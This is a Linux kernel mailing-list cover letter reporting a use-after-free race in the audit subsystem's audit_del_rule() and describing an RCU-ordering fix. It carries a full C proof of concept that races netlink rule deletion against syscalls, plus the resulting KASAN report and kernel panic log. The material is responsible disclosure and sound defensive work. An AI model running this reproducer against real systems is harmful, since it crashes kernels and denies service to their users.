Received: from mail-pl1-f181.google.com (mail-pl1-f181.google.com [209.85.214.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DD67246A5E3
	for <audit@vger.kernel.org>; Tue, 21 Jul 2026 15:37:51 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784648274; cv=none; b=PwmOJZ/LahM/si9Z1d2SVwJlrLa3/m6UWfQAIjognE177z72g7riDGtrWN5/rLsRAaMX85UfKRJL8bP7BpNeBDgRKEncVb+1dTydFQ7N1dQb9pALJ9z5WopfC2WjtxZnryjHtfNLEDLnmGI4UrEX7QKsVWH5Bw6ocCgwZJJ7JMk=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784648274; c=relaxed/simple;
	bh=+fdc5kA6I2EbPhfEWlbzu/OB/C2Y4PYiHK/SOVHKkgY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=KH0MoVjBLkzyVWInxNCBCqMob5AADSqkUuixXClG6l6RRZut1y8oYBaFgF/AhT7tchn55mZpMsfGuLabJHC+hTuxIeGIkP8bGTSmNp9MNk6mQCBl9X1NWkGD4cnVOpHMkxU1d6P2CpW5f3DsqYwvKPR/CK4gfPdnW+hDx7+YGPo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=aGSRNg7S; arc=none smtp.client-ip=209.85.214.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="aGSRNg7S"
Received: by mail-pl1-f181.google.com with SMTP id d9443c01a7336-2ce87c7e3bbso129264605ad.1
        for <audit@vger.kernel.org>; Tue, 21 Jul 2026 08:37:51 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784648271; x=1785253071; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=8PdLia27zceawrOrxS1lW42WELvjmXkDhj2OjNAT11Y=;
        b=aGSRNg7SsqcQJ49FG+j7NTLZpApbMJThr+tE7BPrzZzx9by9xDKkZBmpsTVkbBoJm8
         syUnSFh+YSgHVo+WxyPLtU4JBZt5pWuOzm+YaK2LSp/D8joLU+jCsAjz3ZXRpDM7TMOD
         s/BjWxSCUgBUHzQxNg4aXlmjQE2MQ3wOPvVALULW6jsHnsJFDOl5ChwsBO7FeBYpeVfC
         fWm4IIAVcmO84yQ5+gAgZsOeXI76OLWEL5lsqfUVFiG7WjqtbrauwFLzfh+5kW0izl+O
         pappExb91o+J9JQTk8NbE41U8f7HFnIyxYbYQIWZs/n3HLJnyoWn1pNhmW98z0OkR4Dh
         WL/A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784648271; x=1785253071;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=8PdLia27zceawrOrxS1lW42WELvjmXkDhj2OjNAT11Y=;
        b=LXKjVDVWNYGA+BhGma6hs4D76CRPQvGvk+FARriuESutzuj/akENF3airdomNwGVzn
         u1qEUCD7+hnL9ocoFEeUVm9Jd7htIxe/lcGW2QoxYOxIBst0hLpckOwWFLLyMH4OCWM0
         0RjQ2Y81HSkrgQaCK2wZbKprf94kt8RS+ObcaDeScEawvDS+SXqGQHGASQFPMciwJifi
         4qF1ai2LS4z7Zc76ErrhD0TtsZuH2wqCQu+buqImogyLGENVohi4ekh7v11Yhc2vYvpb
         YusWuXIgnxDQBlGBvvZ+ps1dROabbZX+UNeTKt5GCkosaC0e3Qr8ES0GkcpHSh6isu8R
         xWcw==
X-Gm-Message-State: AOJu0YxXHDi7OC7kxZ4TETKY4XX0WEUFuXZM0i13sXX4rIYsXUZGQSh4
	PdL3bnZQfaeH+e3e45V2dRd91FJsGKSYG233dZ1ItEFprglob/KZpW1GNguiUHdi
X-Gm-Gg: AR+sD137J6YSqOGpy8eigAHLXjcxF5MGhGgPVQzcA6C+fpope32PYX4H1B5yxCcaZ+u
	S9zMdYnnMzM/VPZgW/5zksGm9/edNpDJCPgmYoWslI0ErRN0OekGccef7A5P1dx7dU9LT6s0gll
	0SfuzBSuzz5uhris1GFNqyMJySAoU/h86fpFWWZEzYx4UPt5y/p6zNHBiFfNwmc77t7Wn3E4Rhm
	uh+lA91DKpjaTuEtGf5Yp3C7qJsgcOW/4+ojX+mHrc3XuCdIDRwXei2bwO8SEBB48XdTPlqBNDq
	aC8c6zZQjMs5tZMOZWohy1CgXvQ478AcsOzAXC6eKXY4BgbHulRcXlwWQAzY3x2c6wlvvPzmWSB
	sklvD0l4DvrgQwvPuMM7l1zvBFfESmtXe/vCbWFjEOsX6IgEv0XikjvqvGhNm0+NH9G2Xh7y6eL
	piCVp+g+GcWQFBHj6Etw==
X-Received: by 2002:a17:903:988:b0:2cc:f5aa:9513 with SMTP id d9443c01a7336-2cf34821a87mr219542725ad.10.1784648270989;
        Tue, 21 Jul 2026 08:37:50 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([144.48.80.242])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cf344b1ef8sm81759245ad.21.2026.07.21.08.37.45
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 21 Jul 2026 08:37:50 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: audit@vger.kernel.org
Cc: paul@paul-moore.com,
	eparis@redhat.com,
	rgb@redhat.com,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] audit: fix use-after-free in audit_del_rule
Date: Tue, 21 Jul 2026 23:37:40 +0800
Message-ID: <cover.1784611349.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: audit@vger.kernel.org
List-Id: <audit.vger.kernel.org>
List-Subscribe: <mailto:audit+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:audit+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in kernel/auditfilter.c. The bug is reachable by a local user via the audit subsystem.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

audit_del_rule() destroys e->rule.exe via audit_remove_mark_rule()
before unlinking the rule from RCU-visible filter lists and waiting for a
grace period. Concurrent readers in audit_filter() and
audit_filter_rules() still dereference e->rule.exe, while the fsnotify
mark can be freed on an independent lifetime path. This creates a use-after-free
window on rule->exe during rule deletion.

To fix this, we ensure that the rule is unlinked from the RCU-visible lists and
synchronize_rcu() is invoked before calling audit_remove_mark_rule(). This
guarantees that all existing RCU readers have exited their critical sections
before any underlying resources are destroyed.

Reproducer:

gcc -O2 -static -o poc poc.c
./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE
#include <errno.h>
#include <linux/audit.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef SYS_gettid
#define SYS_gettid __NR_gettid
#endif

static atomic_int g_stop = 0;

struct rule_blob {
    struct audit_rule_data *rule;
    size_t len;
};

static struct rule_blob g_rule;

static int nl_open(void)
{
    int fd;
    struct sockaddr_nl addr;

    fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_AUDIT);
    if (fd < 0)
        return -1;

    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_pid = (uint32_t)syscall(SYS_gettid);

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int nl_send(int fd, uint16_t type, const void *payload, size_t payload_len,
                   uint16_t flags, uint32_t seq)
{
    char buf[16384];
    struct nlmsghdr *h = (struct nlmsghdr *)buf;
    struct sockaddr_nl dst;
    struct iovec iov;
    struct msghdr msg;

    if (NLMSG_SPACE(payload_len) > sizeof(buf))
        return -EMSGSIZE;

    memset(h, 0, NLMSG_SPACE(payload_len));
    h->nlmsg_len = NLMSG_LENGTH(payload_len);
    h->nlmsg_type = type;
    h->nlmsg_flags = NLM_F_REQUEST | flags;
    h->nlmsg_seq = seq;

    if (payload_len)
        memcpy(NLMSG_DATA(h), payload, payload_len);

    memset(&dst, 0, sizeof(dst));
    dst.nl_family = AF_NETLINK;

    iov.iov_base = h;
    iov.iov_len = h->nlmsg_len;

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = &dst;
    msg.msg_namelen = sizeof(dst);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    if (sendmsg(fd, &msg, 0) < 0)
        return -errno;
    return 0;
}

static int nl_ack(int fd, uint32_t seq)
{
    char buf[8192];

    for (;;) {
        ssize_t n = recv(fd, buf, sizeof(buf), 0);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -errno;
        }

        for (struct nlmsghdr *h = (struct nlmsghdr *)buf;
             NLMSG_OK(h, (unsigned int)n);
             h = NLMSG_NEXT(h, n)) {
            if (h->nlmsg_type != NLMSG_ERROR)
                continue;
            if (h->nlmsg_seq != seq)
                continue;
            return ((struct nlmsgerr *)NLMSG_DATA(h))->error;
        }
    }
}

static int nl_req_ack(int fd, uint16_t type, const void *payload, size_t payload_len, uint32_t seq)
{
    int ret = nl_send(fd, type, payload, payload_len, NLM_F_ACK, seq);
    if (ret < 0)
        return ret;
    return nl_ack(fd, seq);
}

static int set_audit_enabled(int fd, int enabled)
{
    struct audit_status st;

    memset(&st, 0, sizeof(st));
    st.mask = AUDIT_STATUS_ENABLED;
    st.enabled = enabled;

    return nl_req_ack(fd, AUDIT_SET, &st, sizeof(st), 0x100);
}

static struct rule_blob build_rule(const char *exe)
{
    struct rule_blob rb = {0};
    size_t exe_len = strlen(exe);
    size_t len = sizeof(struct audit_rule_data) + exe_len;
    struct audit_rule_data *r = calloc(1, len);
    int sysno = __NR_gettid;

    if (!r)
        return rb;

    r->flags = AUDIT_FILTER_EXIT;
    r->action = AUDIT_NEVER;

    if (sysno >= 0 && sysno < AUDIT_BITMASK_SIZE * 32)
        r->mask[AUDIT_WORD(sysno)] |= AUDIT_BIT(sysno);

    r->field_count = AUDIT_MAX_FIELDS;
    for (int i = 0; i < AUDIT_MAX_FIELDS - 1; i++) {
        r->fields[i] = AUDIT_UID;
        r->values[i] = 0;
        r->fieldflags[i] = AUDIT_EQUAL;
    }
    r->fields[AUDIT_MAX_FIELDS - 1] = AUDIT_EXE;
    r->values[AUDIT_MAX_FIELDS - 1] = (uint32_t)exe_len;
    r->fieldflags[AUDIT_MAX_FIELDS - 1] = AUDIT_EQUAL;
    r->buflen = (uint32_t)exe_len;
    memcpy(r->buf, exe, exe_len);

    rb.rule = r;
    rb.len = len;
    return rb;
}

static void *syscall_thread(void *arg)
{
    (void)arg;
    while (!atomic_load_explicit(&g_stop, memory_order_relaxed)) {
        (void)syscall(__NR_gettid);
        asm volatile("" ::: "memory");
    }
    return NULL;
}

static void *churn_thread(void *arg)
{
    int fd = nl_open();
    uint32_t seq = 0x200000 + (uint32_t)(intptr_t)arg * 100000;

    if (fd < 0)
        return NULL;

    while (!atomic_load_explicit(&g_stop, memory_order_relaxed)) {
        (void)nl_send(fd, AUDIT_DEL_RULE, g_rule.rule, g_rule.len, 0, seq++);
        (void)nl_send(fd, AUDIT_ADD_RULE, g_rule.rule, g_rule.len, 0, seq++);
    }

    close(fd);
    return NULL;
}

int main(int argc, char **argv)
{
    int runtime = 180;
    int syscall_threads = 64;
    int churners = 8;
    int fd, ret;
    pthread_t *tids;

    if (argc > 1)
        runtime = atoi(argv[1]);
    if (argc > 2)
        syscall_threads = atoi(argv[2]);
    if (argc > 3)
        churners = atoi(argv[3]);

    if (syscall_threads < 1)
        syscall_threads = 1;
    if (churners < 1)
        churners = 1;

    g_rule = build_rule("/tmp/poc_exit");
    if (!g_rule.rule) {
        fprintf(stderr, "build_rule failed\n");
        return 1;
    }

    fd = nl_open();
    if (fd < 0) {
        perror("nl_open");
        return 1;
    }

    ret = set_audit_enabled(fd, 1);
    if (ret < 0)
        fprintf(stderr, "AUDIT_SET enable failed: %d (%s)\n", ret, strerror(-ret));

    ret = nl_req_ack(fd, AUDIT_ADD_RULE, g_rule.rule, g_rule.len, 0x200);
    if (ret < 0 && ret != -EEXIST) {
        fprintf(stderr, "AUDIT_ADD_RULE failed: %d (%s)\n", ret, strerror(-ret));
        return 1;
    }

    tids = calloc((size_t)(syscall_threads + churners), sizeof(*tids));
    if (!tids)
        return 1;

    printf("start runtime=%d syscall_threads=%d churners=%d\n", runtime, syscall_threads, churners);
    fflush(stdout);

    for (int i = 0; i < syscall_threads; i++)
        pthread_create(&tids[i], NULL, syscall_thread, NULL);
    for (int i = 0; i < churners; i++)
        pthread_create(&tids[syscall_threads + i], NULL, churn_thread, (void *)(intptr_t)i);

    sleep(runtime);
    atomic_store(&g_stop, 1);

    for (int i = 0; i < syscall_threads + churners; i++)
        pthread_join(tids[i], NULL);

    (void)nl_req_ack(fd, AUDIT_DEL_RULE, g_rule.rule, g_rule.len, 0x300);
    (void)set_audit_enabled(fd, 0);

    close(fd);
    free(tids);
    free(g_rule.rule);

    puts("done");
    return 0;
}

------END poc.c--------

----BEGIN crash log----

root@syzkaller:/mnt/home_host/new_poc# ./poc
[  257.926507][   T30] audit: type=1305 audit(1784610146.851:113): auid=0 ses=11
start runtime=180 syscall_threads=64 churners=8
[  258.455876][ T9267] =========================================================
[  258.456796][ T9267] BUG: KASAN: slab-use-after-free in audit_mark_compare+0x0
[  258.457821][ T9267] Read of size 8 at addr ffff88801fb6f708 by task poc/9267
[  258.458538][ T9267] 
[  258.458926][ T9267] CPU: 0 UID: 0 PID: 9267 Comm: poc Not tainted 7.0.0-rc6- 
[  258.458941][ T9267] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  258.458957][ T9267] Call Trace:
[  258.458978][ T9267]  <TASK>
[  258.458981][ T9267]  dump_stack_lvl+0x10e/0x1f0
[  258.459094][ T9267]  print_report+0xf7/0x600
[  258.459216][ T9267]  ? preempt_count_sub+0x13/0xd0
[  258.459244][ T9267]  ? __virt_addr_valid+0x1ab/0x330
[  258.459282][ T9267]  ? __phys_addr+0x41/0x90
[  258.459298][ T9267]  ? audit_mark_compare+0x21/0xa0
[  258.459308][ T9267]  kasan_report+0xe4/0x120
[  258.459316][ T9267]  ? audit_mark_compare+0x21/0xa0
[  258.459338][ T9267]  audit_mark_compare+0x21/0xa0
[  258.459365][ T9267]  audit_exe_compare+0xba/0xd0
[  258.459375][ T9267]  audit_filter_rules+0x1332/0x2680
[  258.459384][ T9267]  ? __pfx___schedule+0x10/0x10
[  258.459539][ T9267]  ? __pfx_audit_filter_rules+0x10/0x10
[  258.459547][ T9267]  ? __pfx___schedule+0x10/0x10
[  258.459571][ T9267]  __audit_filter_op+0x1a9/0x260
[  258.459580][ T9267]  ? __pfx___audit_filter_op+0x10/0x10
[  258.459587][ T9267]  ? lock_acquire+0x303/0x360
[  258.459633][ T9267]  ? lock_release+0x225/0x2f0
[  258.459639][ T9267]  audit_filter_syscall.part.0+0x72/0x1b0
[  258.459647][ T9267]  __audit_syscall_exit+0x121/0x1d0
[  258.459655][ T9267]  do_syscall_64+0x7bf/0x800
[  258.459668][ T9267]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  258.459698][ T9267] RIP: 0033:0x4280bd
[  258.459724][ T9267] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa8
[  258.459730][ T9267] RSP: 002b:00007faa73a36208 EFLAGS: 00000246 ORIG_RAX: 00a
[  258.459750][ T9267] RAX: 0000000000002433 RBX: 00007faa73a36cdc RCX: 0000000d
[  258.459754][ T9267] RDX: 00000000004280bd RSI: 00000000004280bd RDI: 0000000d
[  258.459806][ T9267] RBP: 00007faa73a36240 R08: 0000000000000000 R09: 00000000
[  258.459810][ T9267] R10: 0000000000000000 R11: 0000000000000246 R12: 00007fa0
[  258.459814][ T9267] R13: ffffffffffffffb8 R14: 0000000000000000 R15: 00007ff0
[  258.459821][ T9267]  </TASK>
[  258.459823][ T9267] 
[  258.480147][   T30] audit: type=1305 audit(1784610147.361:114): auid=0 ses=11
[  258.480521][ T9267] Allocated by task 9264:
[  258.481306][   T30] audit: type=1305 audit(1784610147.361:115): auid=0 ses=10
[  258.481949][ T9267]  kasan_save_stack+0x33/0x60
[  258.487115][ T9267]  kasan_save_track+0x14/0x30
[  258.487644][ T9267]  __kasan_kmalloc+0xaa/0xb0
[  258.488362][ T9267]  audit_alloc_mark+0x352/0x390
[  258.488973][ T9267]  audit_data_to_entry+0xb95/0x1550
[  258.489458][ T9267]  audit_rule_change+0x2de/0x9b0
[  258.489910][ T9267]  audit_receive_msg+0x9f1/0x26c0
[  258.490375][ T9267]  audit_receive+0x1e6/0x320
[  258.491308][ T9267]  netlink_unicast+0x44c/0x5c0
[  258.491813][ T9267]  netlink_sendmsg+0x493/0x8c0
[  258.492271][ T9267]  ____sys_sendmsg+0x78e/0x7c0
[  258.492751][ T9267]  ___sys_sendmsg+0x129/0x1b0
[  258.493491][ T9267]  __sys_sendmsg+0x133/0x1d0
[  258.493914][ T9267]  do_syscall_64+0x116/0x800
[  258.494340][ T9267]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  258.495011][ T9267] 
[  258.495241][ T9267] Freed by task 56:
[  258.495636][ T9267]  kasan_save_stack+0x33/0x60
[  258.496062][ T9267]  kasan_save_track+0x14/0x30
[  258.496508][ T9267]  kasan_save_free_info+0x3b/0x60
[  258.496992][ T9267]  __kasan_slab_free+0x5f/0x80
[  258.497414][ T9267]  kfree+0x2e2/0x6c0
[  258.497768][ T9267]  fsnotify_final_mark_destroy+0x46/0x70
[  258.498309][ T9267]  fsnotify_mark_destroy_workfn+0x18d/0x220
[  258.498823][ T9267]  process_one_work+0x62b/0xfb0
[  258.499393][ T9267]  worker_thread+0x3fd/0x7e0
[  258.499857][ T9267]  kthread+0x221/0x280
[  258.500263][ T9267]  ret_from_fork+0x899/0x9b0
[  258.500695][ T9267]  ret_from_fork_asm+0x1a/0x30
[  258.501142][ T9267] 
[  258.501470][ T9267] The buggy address belongs to the object at ffff88801fb6f0
[  258.501470][ T9267]  which belongs to the cache kmalloc-192 of size 192
[  258.503484][ T9267] The buggy address is located 8 bytes inside of
[  258.503484][ T9267]  freed 192-byte region [ffff88801fb6f700, ffff88801fb6f7)
[  258.504798][ T9267] 
[  258.505036][ T9267] The buggy address belongs to the physical page:
[  258.505668][ T9267] page: refcount:0 mapcount:0 mapping:0000000000000000 indf
[  258.506476][ T9267] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
[  258.507106][ T9267] page_type: f5(slab)
[  258.507786][ T9267] raw: 00fff00000000000 ffff8880178413c0 dead000000000100 2
[  258.508902][ T9267] raw: 0000000000000000 0000000800100010 00000000f5000000 0
[  258.509716][ T9267] page dumped because: kasan: bad access detected
[  258.510322][ T9267] page_owner tracks the page as allocated
[  258.510896][ T9267] page last allocated via order 0, migratetype Unmovable, 4
[  258.512959][ T9267]  post_alloc_hook+0xe6/0x100
[  258.513426][ T9267]  get_page_from_freelist+0x55c/0x2210
[  258.513918][ T9267]  __alloc_frozen_pages_noprof+0x221/0x1cb0
[  258.514481][ T9267]  new_slab+0xa2/0x5f0
[  258.514873][ T9267]  refill_objects+0xe3/0x430
[  258.515330][ T9267]  __pcs_replace_empty_main+0x2ed/0x650
[  258.516237][ T9267]  __kmalloc_noprof+0x658/0x820
[  258.517049][ T9267]  usb_alloc_urb+0x73/0xa0
[  258.517562][ T9267]  usb_control_msg+0x121/0x290
[  258.518032][ T9267]  usb_get_descriptor+0x9d/0x160
[  258.518496][ T9267]  usb_get_device_descriptor+0x5a/0xc0
[  258.519017][ T9267]  register_root_hub+0xb0/0x400
[  258.519488][ T9267]  usb_add_hcd+0x737/0xd90
[  258.520235][ T9267]  dummy_hcd_probe+0x108/0x240
[  258.520782][ T9267]  platform_probe+0xb4/0x130
[  258.521236][ T9267]  really_probe+0x1a0/0x6f0
[  258.521669][ T9267] page last free pid 1 tgid 1 stack trace:
[  258.522261][ T9267]  __free_frozen_pages+0x52d/0x960
[  258.522762][ T9267]  qlist_free_all+0x47/0xf0
[  258.523202][ T9267]  kasan_quarantine_reduce+0x195/0x1e0
[  258.523702][ T9267]  __kasan_slab_alloc+0x69/0x90
[  258.524316][ T9267]  __kmalloc_cache_noprof+0x23e/0x6e0
[  258.524911][ T9267]  device_add+0x9e7/0x1060
[  258.525338][ T9267]  usb_new_device+0x826/0xe20
[  258.525793][ T9267]  register_root_hub+0x196/0x400
[  258.526226][ T9267]  usb_add_hcd+0x737/0xd90
[  258.526618][ T9267]  dummy_hcd_probe+0x108/0x240
[  258.527126][ T9267]  platform_probe+0xb4/0x130
[  258.527597][ T9267]  really_probe+0x1a0/0x6f0
[  258.527989][ T9267]  __driver_probe_device+0x15d/0x300
[  258.528889][ T9267]  driver_probe_device+0x4a/0x140
[  258.529368][ T9267]  __device_attach_driver+0x14a/0x240
[  258.530030][ T9267]  bus_for_each_drv+0x130/0x1a0
[  258.530758][ T9267] 
[  258.531521][ T9267] Memory state around the buggy address:
[  258.532580][ T9267]  ffff88801fb6f600: 00 00 00 00 00 00 00 00 00 00 00 00 00
[  258.533421][ T9267]  ffff88801fb6f680: 00 fc fc fc fc fc fc fc fc fc fc fc fc
[  258.534107][ T9267] >ffff88801fb6f700: fa fb fb fb fb fb fb fb fb fb fb fb fb
[  258.534811][ T9267]                       ^
[  258.535202][ T9267]  ffff88801fb6f780: fb fb fb fb fb fb fb fb fc fc fc fc fc
[  258.535905][ T9267]  ffff88801fb6f800: 00 00 00 00 00 00 00 00 00 00 00 00 00
[  258.536800][ T9267] =========================================================
[  258.579900][   T30] audit: type=1300 audit(1784610147.361:115): arch=c000003)
[  258.773269][   T30] audit: type=1327 audit(1784610147.361:115): proctitle="."
[  258.774357][   T30] audit: type=1305 audit(1784610147.361:116): auid=0 ses=11
[  258.859256][   T30] audit: type=1300 audit(1784610147.361:116): arch=c000003)
[  258.992339][   T30] audit: type=1327 audit(1784610147.361:116): proctitle="."
[  258.993143][   T30] audit: type=1300 audit(1784610147.361:114): arch=c000003)
[  259.140572][   T30] audit: type=1306 audit(1784610147.361:114): saddr=1000000
[  261.216937][ T9267] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  261.217841][ T9267] CPU: 0 UID: 0 PID: 9267 Comm: poc Not tainted 7.0.0-rc6- 
[  261.218702][ T9267] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a4
[  261.219693][ T9267] Call Trace:
[  261.219971][ T9267]  <TASK>
[  261.220216][ T9267]  dump_stack_lvl+0x3b/0x1f0
[  261.220601][ T9267]  vpanic+0x8b4/0x930
[  261.220972][ T9267]  ? __pfx_vpanic+0x10/0x10
[  261.221574][ T9267]  ? audit_mark_compare+0x21/0xa0
[  261.222155][ T9267]  panic+0xca/0xd0
[  261.222521][ T9267]  ? __pfx_panic+0x10/0x10
[  261.223114][ T9267]  ? audit_mark_compare+0x21/0xa0
[  261.224082][ T9267]  ? preempt_schedule_thunk+0x16/0x40
[  261.224628][ T9267]  ? preempt_schedule_common+0x3b/0x80
[  261.225514][ T9267]  ? preempt_schedule_thunk+0x16/0x40
[  261.226494][ T9267]  ? check_panic_on_warn+0x1f/0xb0
[  261.227600][ T9267]  check_panic_on_warn+0xab/0xb0
[  261.228426][ T9267]  end_report+0x132/0x180
[  261.228933][ T9267]  kasan_report+0xf4/0x120
[  261.229375][ T9267]  ? audit_mark_compare+0x21/0xa0
[  261.229826][ T9267]  audit_mark_compare+0x21/0xa0
[  261.230429][ T9267]  audit_exe_compare+0xba/0xd0
[  261.230947][ T9267]  audit_filter_rules+0x1332/0x2680
[  261.231437][ T9267]  ? __pfx___schedule+0x10/0x10
[  261.232123][ T9267]  ? __pfx_audit_filter_rules+0x10/0x10
[  261.232760][ T9267]  ? __pfx___schedule+0x10/0x10
[  261.233226][ T9267]  __audit_filter_op+0x1a9/0x260
[  261.233681][ T9267]  ? __pfx___audit_filter_op+0x10/0x10
[  261.234230][ T9267]  ? lock_acquire+0x303/0x360
[  261.234647][ T9267]  ? lock_release+0x225/0x2f0
[  261.235083][ T9267]  audit_filter_syscall.part.0+0x72/0x1b0
[  261.235613][ T9267]  __audit_syscall_exit+0x121/0x1d0
[  261.236459][ T9267]  do_syscall_64+0x7bf/0x800
[  261.237258][ T9267]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  261.238087][ T9267] RIP: 0033:0x4280bd
[  261.238453][ T9267] Code: b3 66 2e 0f 1f 84 00 00 00 00 00 66 90 f3 0f 1e fa8
[  261.240923][ T9267] RSP: 002b:00007faa73a36208 EFLAGS: 00000246 ORIG_RAX: 00a
[  261.241676][ T9267] RAX: 0000000000002433 RBX: 00007faa73a36cdc RCX: 0000000d
[  261.242408][ T9267] RDX: 00000000004280bd RSI: 00000000004280bd RDI: 0000000d
[  261.243214][ T9267] RBP: 00007faa73a36240 R08: 0000000000000000 R09: 00000000
[  261.243942][ T9267] R10: 0000000000000000 R11: 0000000000000246 R12: 00007fa0
[  261.244898][ T9267] R13: ffffffffffffffb8 R14: 0000000000000000 R15: 00007ff0
[  261.245614][ T9267]  </TASK>
[  261.246561][ T9267] Kernel Offset: disabled
[  261.247004][ T9267] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Luxiao Xu

Luxiao Xu (1):
  audit: fix potential use-after-free in audit_del_rule()

 kernel/auditfilter.c | 6 ++++--
 1 file changed, 4 insertions(+), 2 deletions(-)

-- 
2.43.0

